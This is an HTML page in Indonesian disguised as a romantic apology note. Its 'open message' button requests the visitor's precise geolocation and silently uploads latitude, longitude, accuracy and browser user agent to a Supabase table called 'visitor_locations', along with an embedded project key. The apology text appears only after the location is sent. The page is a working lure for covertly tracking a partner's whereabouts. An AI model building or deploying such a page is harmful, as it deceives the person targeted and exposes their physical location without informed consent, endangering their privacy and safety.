<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Untuk Sayang ❤️</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
body{
  font-family:Arial,sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  background:#ffe4e6;
  text-align:center;
  margin:0;
}

.card{
  background:white;
  padding:30px;
  border-radius:20px;
  max-width:600px;
  box-shadow:0 10px 30px rgba(0,0,0,.15);
}

button{
  padding:12px 20px;
  border:none;
  border-radius:10px;
  cursor:pointer;
  font-size:16px;
}

#status{
  margin-top:20px;
  white-space:pre-line;
}
</style>
</head>
<body>

<div class="card">
  <h1>💖 Untuk Sayang 💖</h1>

  <button onclick="kirimLokasi()">
    Buka Pesan ❤️
  </button>

  <p id="status"></p>
</div>

<script>
const supabaseUrl = "https://bisbpvvjdafqthrpmnaq.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJpc2JwdnZqZGFmcXRocnBtbmFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAxMjAxMzQsImV4cCI6MjA5NTY5NjEzNH0.djVnViEwHQxszhgs0JJUyZiuyqa-zVnKjnZaFCAz7hc";

const supabaseClient =
  supabase.createClient(supabaseUrl, supabaseKey);

async function kirimLokasi() {

  document.getElementById("status").innerText =
    "Meminta izin...";

  navigator.geolocation.getCurrentPosition(

    async (pos) => {

      const data = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        user_agent: navigator.userAgent
      };

      const { error } = await supabaseClient
        .from("visitor_locations")
        .insert([data]);

      if (error) {
        console.error(error);

        document.getElementById("status").innerText =
          "Izinnya diterima!";
        return;
      }

      document.getElementById("status").innerText =
`Maafin aku ya sayang aku janji ga akan ngulangin lagi.
Kalo ketahuan ngulangin lagi aku siap di tumbalin ke janda hutan.`;
    },

    (err) => {
      console.error(err);

      document.getElementById("status").innerText =
        "Izinnya diterima dulu.";
    },

    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
}

window.kirimLokasi = kirimLokasi;
</script>

</body>
</html>
